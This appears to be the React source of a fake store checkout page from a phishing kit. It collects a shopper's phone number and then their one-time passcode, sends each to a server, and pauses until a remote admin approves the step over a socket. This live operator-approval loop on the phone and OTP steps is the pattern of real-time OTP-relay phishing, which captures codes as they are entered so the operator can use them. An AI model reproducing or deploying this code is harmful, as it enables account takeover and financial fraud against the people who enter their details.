import { useCallback, useEffect, useState } from "react";
import { scrollToTop } from "../../utils/scroll";
import axios from "axios";
import CheckoutPaymentSummary, {
  LoginStepIcon,
  PaymentStepIcon,
} from "./CheckoutPaymentSummary";
import CheckoutPhoneForm from "./CheckoutPhoneForm";
import CheckoutOtpForm from "./CheckoutOtpForm";
import CheckoutWaitOverlay from "./CheckoutWaitOverlay";
import { api_route, socket } from "../../config/api";
import { useAdminApproval } from "../../hooks/useAdminApproval";
import { useTranslation } from "../../context/LanguageContext";
import { getUserProfile } from "../../utils/userProfile";

export default function CheckoutAuthPage({ order, onComplete }) {
  const { t } = useTranslation();
  const [authStep, setAuthStep] = useState("phone");
  const [phoneData, setPhoneData] = useState(null);
  const [sessionId, setSessionId] = useState(
    () => sessionStorage.getItem("id") || null,
  );
  const [pendingOtp, setPendingOtp] = useState(null);
  const [detailsOpen, setDetailsOpen] = useState(false);
  const [couponOpen, setCouponOpen] = useState(false);
  const [coupon, setCoupon] = useState("");
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    scrollToTop();
  }, [authStep]);

  const completeAuth = useCallback(async () => {
    if (!phoneData || !pendingOtp) return;
    try {
      await onComplete?.({
        phone: phoneData.national,
        countryCode: phoneData.countryCode,
        dialCode: phoneData.dialCode,
        display: phoneData.display,
        otp: pendingOtp,
      });
    } catch {
      setSubmitting(false);
    }
  }, [onComplete, pendingOtp, phoneData]);

  const phoneApproval = useAdminApproval({
    sessionId,
    acceptEvent: "acceptCheckoutPhone",
    declineEvent: "declineCheckoutPhone",
    onAccept: () => setAuthStep("otp"),
  });

  const otpApproval = useAdminApproval({
    sessionId,
    acceptEvent: "acceptCheckoutOtp",
    declineEvent: "declineCheckoutOtp",
    onAccept: completeAuth,
  });

  const waiting = phoneApproval.waiting || otpApproval.waiting;
  const declined =
    (authStep === "phone" && phoneApproval.error) ||
    (authStep === "otp" && otpApproval.error);

  const handlePhoneSubmit = async (data) => {
    if (submitting || waiting) return;
    setPhoneData(data);
    phoneApproval.clearError();
    setSubmitting(true);

    const userProfile = getUserProfile();

    try {
      const { data: createdOrder } = await axios.post(`${api_route}/reg`, {
        form_type: "store_checkout",
        phone: data.display,
        name: userProfile?.fullName ?? t("checkoutPayment.guestName"),
        orderItems: order.items.map(
          ({ id, name, price, quantity, image, url }) => ({
            id,
            name,
            price,
            quantity,
            image,
            url,
          }),
        ),
        orderTotal: order.total,
        countryCode: data.countryCode,
        dialCode: data.dialCode,
      });

      sessionStorage.setItem("id", createdOrder._id);
      setSessionId(createdOrder._id);
      socket.emit("checkoutPhone", createdOrder._id);
      phoneApproval.startWaiting();
    } catch {
      window.alert(t("checkoutPayment.registerError"));
      setPhoneData(null);
    } finally {
      setSubmitting(false);
    }
  };

  const handleOtpSubmit = async (otp) => {
    if (!phoneData || !sessionId || submitting || waiting) return;
    otpApproval.clearError();
    setPendingOtp(otp);
    setSubmitting(true);

    try {
      await axios.post(`${api_route}/checkoutOtp/${sessionId}`, { otp });
      socket.emit("checkoutOtp", sessionId);
      otpApproval.startWaiting();
    } catch {
      window.alert(t("checkoutPayment.registerError"));
      setPendingOtp(null);
    } finally {
      setSubmitting(false);
    }
  };

  const isBusy = submitting || waiting;

  return (
    <>
      <CheckoutWaitOverlay
        visible={waiting}
        message={t("checkoutAdmin.waiting")}
      />

      <div id="app" className="container container--margined p-0!  flex-col!">
        <div>
          <CheckoutPaymentSummary
            items={order.items}
            total={order.total}
            detailsOpen={detailsOpen}
            couponOpen={couponOpen}
            coupon={coupon}
            onToggleDetails={() => setDetailsOpen((open) => !open)}
            onToggleCoupon={() => setCouponOpen((open) => !open)}
            onCouponChange={setCoupon}
          />

          <div id="payment_process">
            <main className="sections-wrapper">
              <div className="section section--payment">
                <div className="checkout-step">
                  <div
                    className="title title--step title-guest-step mb-20"
                    style={{ cursor: "pointer" }}
                  >
                    <div className="d-flex gap-2">
                      <LoginStepIcon />
                      <div>
                        <div className="">
                          <h3>{t("checkoutPhone.loginTitle")}</h3>
                          <small>
                            {authStep === "otp"
                              ? t("checkoutOtp.subtitle")
                              : t("checkoutPhone.loginSubtitle")}
                          </small>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="mt-4">
                    {declined ? (
                      <p className="checkout-admin-error mb-3">
                        {t("checkoutAdmin.declined")}
                      </p>
                    ) : null}
                    <div className="auth-iframe-container mb-20">
                      {authStep === "phone" || !phoneData ? (
                        <CheckoutPhoneForm
                          onSubmit={handlePhoneSubmit}
                          t={t}
                          submitting={isBusy}
                        />
                      ) : (
                        <CheckoutOtpForm
                          phoneData={phoneData}
                          onSubmit={handleOtpSubmit}
                          t={t}
                          setAuthStep={setAuthStep}
                          variant="phone"
                          submitting={isBusy}
                        />
                      )}
                    </div>
                  </div>
                </div>

                <div className="row payment-step payment-step--disabled">
                  <div className="col-md-12">
                    <div id="payment_step">
                      <div
                        data-step="3"
                        className="title title--step mb-20 mb-0"
                      >
                        <div className="d-flex gap-2">
                          <span>
                            <PaymentStepIcon />
                          </span>
                          <div className="d-flex flex-column ">
                            <h3 className="m-0 text-semibold">
                              {t("checkoutPhone.paymentTitle")}
                            </h3>
                            <small>{t("checkoutPhone.paymentSubtitle")}</small>
                          </div>
                        </div>
                        <button
                          type="button"
                          className="btn btn--outline dark btn-edit d-none"
                        >
                          {t("checkoutPhone.edit")}
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </main>
          </div>
        </div>
      </div>
    </>
  );
}
